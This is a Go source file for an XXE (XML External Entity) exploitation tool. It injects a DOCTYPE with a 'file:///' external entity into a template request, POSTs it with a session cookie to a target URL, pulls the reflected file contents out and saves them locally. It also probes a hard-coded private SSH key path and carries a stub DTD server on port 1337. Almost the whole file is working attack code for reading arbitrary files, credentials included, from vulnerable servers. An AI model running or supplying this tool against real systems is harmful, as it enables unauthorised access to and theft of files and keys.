package xxe

import (
	"bufio"
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"

	fp "path/filepath"

	str "strings"
)

type NodeT struct {
	XMLName xml.Name
	Attrs   []xml.Attr `xml:"-"`
	Content []byte     `xml:",innerxml"`
	Nodes   []NodeT    `xml:",any"`
}

type LeafT struct {
	Name  string
	Value string
}

func walkNodes(nodes []NodeT, f func(NodeT) bool) {
	for _, n := range nodes {
		if f(n) {
			walkNodes(n.Nodes, f)
		}
	}
}

func DirectTest(url, xmlTemplate, cookie, outDir, fileList string) error {
	fmt.Println("testing...")

	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return err
	}

	leafName, err := DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList)
	if err != nil {
		return err
	}

	if leafName == "" {
		return fmt.Errorf("can't find XXE injection")
	}

	files, err := readFileList(fileList)
	if err != nil {
		return err
	}

	for _, file := range files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)

		content, err := getFileContent(url, file, reqXml,
			cookie, outDir, leafName)
		if err != nil {
			return err
		}

		if content != "" {
			locFile := makeLocalPath(outDir, file)
			err = saveFile(locFile, content, false)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string, error) {
	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return "", err
	}

	dec := xml.NewDecoder(bytes.NewBuffer(xmlData))

	var n NodeT
	err = dec.Decode(&n)
	if err != nil {
		return "", err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	files, err := readFileList(fileList)
	if err != nil {
		return "", err
	}

	files = append(files, "c:/users/daniel/.ssh/id_rsa")

	for _, file := range files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)

		for _, leaf := range leafs {
			content, err := getFileContent(url, file, reqXml,
				cookie, outDir, leaf.Name)
			if err != nil {
				return "", err
			}

			if content != "" {
				return leaf.Name, nil
			}
		}
	}

	return "", nil
}

func getFileContent(url, file, reqXml, cookie, outDir, leafName string) (string, error) {
	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
	re := regexp.MustCompile(exp)

	sep := str.Repeat("-=x=", 15) + "-"
	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
	reqXmlMod := re.ReplaceAllString(reqXml, replStr)

	body, err := makeRequest(url, reqXmlMod, cookie, outDir)
	if err != nil {
		return "", err
	}
	if str.Contains(body, sep) {
		bodyFields := str.Split(body, sep)
		return bodyFields[1], nil
	}
	return "", nil
}

func saveFile(file, content string, isDeflated bool) error {
	opts := os.O_CREATE | os.O_TRUNC | os.O_WRONLY
	fd, err := os.OpenFile(file, opts, 0644)
	if err != nil {
		return err
	}
	defer fd.Close()

	fmt.Fprintf(fd, content)

	return nil
}

func readFileList(path string) ([]string, error) {
	var fileList []string

	fd, err := os.Open(path)
	defer fd.Close()
	if err != nil {
		return fileList, err
	}

	input := bufio.NewScanner(fd)
	for input.Scan() {
		line := str.Trim(input.Text(), " ")
		fileList = append(fileList, line)
	}

	return fileList, nil
}

func makeLocalPath(outDir, path string) string {
	path = fp.Clean(path)
	pFields := str.Split(path, "/")

	errPath := pFields[0] == "." || pFields[0] == ".." || pFields[0] == "/"
	if len(pFields) == 1 && errPath {
		return outDir + "/out_file"
	} else if len(pFields) == 1 {
		return fp.Join(outDir, pFields[0])
	}

	var cleanFields []string
	for _, el := range pFields[1:] {
		if el != ".." {
			cleanFields = append(cleanFields, el)
		}
	}

	path = str.Join(cleanFields, "/")
	path = fp.Join(outDir, path)
	os.MkdirAll(fp.Dir(path), 0750)

	return path
}

func makeRequest(url, reqXml, cookie, outDir string) (string, error) {
	client := &http.Client{}

	req, err := http.NewRequest("POST", url, str.NewReader(reqXml))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	bodyText, err := ioutil.ReadAll(resp.Body)

	return string(bodyText), nil
}

func dtdHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/file.dtd" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	if r.Method != "GET" {
		http.Error(w, "Method is not supported.", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, "Hello!")
}

func serveDtd() {
	http.HandleFunc("/file.dtd", dtdHandler)

	fmt.Printf("Starting server at port 1337\n")
	if err := http.ListenAndServe(":1337", nil); err != nil {
		log.Fatal(err)
	}
}
